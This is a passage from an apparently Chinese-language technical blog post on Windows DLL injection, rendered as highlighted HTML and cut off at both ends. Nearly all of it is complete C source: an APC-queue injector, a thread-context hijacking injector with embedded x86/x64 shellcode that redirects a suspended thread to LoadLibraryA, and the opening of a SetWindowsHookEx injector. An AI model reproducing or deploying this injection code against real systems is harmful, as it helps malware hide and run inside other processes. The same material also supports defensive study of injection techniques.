punctuation">(</span>pszDllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Write process memory failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 获取LoadLibraryA函数地址</span> PROC pfnProcAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnProcAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetProcAddress failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 遍历线程</span> HANDLE h <span class="token operator">=</span> <span class="token function">CreateToolhelp32Snapshot</span><span class="token punctuation">(</span>TH32CS_SNAPTHREAD<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>h <span class="token operator">==</span> INVALID_HANDLE_VALUE<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Couldn't create snapshot.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> THREADENTRY32 te<span class="token punctuation">;</span> te<span class="token punctuation">.</span>dwSize <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>te<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">Thread32First</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token operator">&amp;</span>te<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Couldn't get first thread.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> DWORD dwThreadId <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">Thread32Next</span><span class="token punctuation">(</span>h<span class="token punctuation">,</span> <span class="token operator">&amp;</span>te<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>te<span class="token punctuation">.</span>th32OwnerProcessID <span class="token operator">==</span> dwPid<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   dwThreadId <span class="token operator">=</span> te<span class="token punctuation">.</span>th32ThreadID<span class="token punctuation">;</span>   HANDLE hThread <span class="token operator">=</span> <span class="token function">OpenThread</span><span class="token punctuation">(</span>THREAD_SET_CONTEXT<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span>hThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Error: Couldn't open thread %d.\n"</span><span class="token punctuation">,</span> dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   DWORD status <span class="token operator">=</span> <span class="token function">QueueUserAPC</span><span class="token punctuation">(</span><span class="token punctuation">(</span>PAPCFUNC<span class="token punctuation">)</span>pfnProcAddr<span class="token punctuation">,</span> hThread<span class="token punctuation">,</span> <span class="token punctuation">(</span>ULONG_PTR<span class="token punctuation">)</span>pszDllAddr<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Call QueueUserAPC Failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by QueueUserAPC success in thread %d!\n"</span><span class="token punctuation">,</span> dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>h<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SetThreadContext"><a href="#SetThreadContext" class="headerlink" title="SetThreadContext"></a>SetThreadContext</h4><p>将线程挂起后直接修改线程的上下文，将加载DLL的shellcode注入其中，然后恢复线程，在执行完shellcode后线程就会返回正常执行。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">_WIN64</span></span>BYTE sc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">&#123;</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x61</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span>BYTE sc<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token punctuation">&#123;</span>    <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x9c</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span>  <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x53</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x55</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span>  <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x57</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0xDE</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span>  <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x48</span><span class="token punctuation">,</span> <span class="token number">0xB8</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span>    <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span>    <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x5B</span><span class="token punctuation">,</span> <span class="token number">0x5A</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x9D</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span> <span class="token comment">// !WIN_64</span></span><span class="token keyword">void</span> <span class="token function">demoSetThreadContext</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwPid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> CONTEXT ctx<span class="token punctuation">;</span> DWORD dwSize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打开进程</span> HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open process failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 开辟内存</span> LPVOID pszDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pszDllAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 写入内存</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> pszDllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Write process memory failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 获取LoadLibraryA函数地址</span> PROC pfnProcAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnProcAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetProcAddress failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 开辟内存，存放shellcode</span> LPVOID stub <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>stub <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 获取线程句柄</span> DWORD dwThreadId <span class="token operator">=</span> <span class="token function">getThreadId</span><span class="token punctuation">(</span>dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dwThreadId <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> HANDLE hThread <span class="token operator">=</span> <span class="token function">OpenThread</span><span class="token punctuation">(</span><span class="token punctuation">(</span>THREAD_GET_CONTEXT <span class="token operator">|</span> THREAD_SET_CONTEXT <span class="token operator">|</span> THREAD_SUSPEND_RESUME<span class="token punctuation">)</span><span class="token punctuation">,</span> false<span class="token punctuation">,</span> dwThreadId<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open thread failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 挂起线程，获取上下文</span> <span class="token function">SuspendThread</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span> ctx<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_CONTROL<span class="token punctuation">;</span> <span class="token function">GetThreadContext</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifndef</span> <span class="token expression">_WIN64</span></span> DWORD dwOriginIP <span class="token operator">=</span> ctx<span class="token punctuation">.</span>Eip<span class="token punctuation">;</span> ctx<span class="token punctuation">.</span>Eip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD<span class="token punctuation">)</span>stub<span class="token punctuation">;</span> ctx<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_CONTROL<span class="token punctuation">;</span> <span class="token comment">// 构造shellcode，写入上下文</span> DWORD dwOriginProt <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>sc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOriginProt<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOriginIP<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pszDllAddr<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">13</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pfnProcAddr<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">else</span></span> DWORD64 dwOriginIP <span class="token operator">=</span> ctx<span class="token punctuation">.</span>Rip<span class="token punctuation">;</span> ctx<span class="token punctuation">.</span>Rip <span class="token operator">=</span> <span class="token punctuation">(</span>DWORD64<span class="token punctuation">)</span>stub<span class="token punctuation">;</span> ctx<span class="token punctuation">.</span>ContextFlags <span class="token operator">=</span> CONTEXT_CONTROL<span class="token punctuation">;</span> <span class="token comment">// 构造shellcode，写入上下文</span> DWORD dwOriginProt <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> <span class="token function">VirtualProtect</span><span class="token punctuation">(</span>sc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOriginProt<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//printf("%p %p %p\n", dwOriginIP, pszDllAddr, pfnProcAddr);</span> <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>dwOriginIP<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">41</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pszDllAddr<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">memcpy</span><span class="token punctuation">(</span>sc <span class="token operator">+</span> <span class="token number">51</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>pfnProcAddr<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_DEBUG</span></span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"shellcode:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x "</span><span class="token punctuation">,</span> sc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">16</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> i <span class="token operator">==</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span> <span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> stub<span class="token punctuation">,</span> sc<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>sc<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">SetThreadContext</span><span class="token punctuation">(</span>hThread<span class="token punctuation">,</span> <span class="token operator">&amp;</span>ctx<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 恢复线程</span> <span class="token function">ResumeThread</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by SetThreadContext success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-消息Hook"><a href="#2-3-消息Hook" class="headerlink" title="2.3 消息Hook"></a>2.3 消息Hook</h3><h4 id="SetWindowsHookEx"><a href="#SetWindowsHookEx" class="headerlink" title="SetWindowsHookEx"></a>SetWindowsHookEx</h4><p>此函数在调用时会传入一个钩子函数，而在对其他进程或全部进程进行Hook时，要求此函数必须位于DLL中，所以只要我们构造的DLL中包含要Hook的函数就可以完成注入。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;Windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;tlhelp32.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span><span class="token keyword">void</span> <span class="token function">demoSetWindowsHookEx</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwProcessId<span class="token punctuation">,</span> LPCSTR strProcName<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">// 获取第一个线程ID</span> DWORD dwThreadId <span class="token operator">=</span> <span class="token function">getThreadId</span><span class="token punctuation">(</span>dwProcessId<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>dwThreadId <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Get thread ID failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token 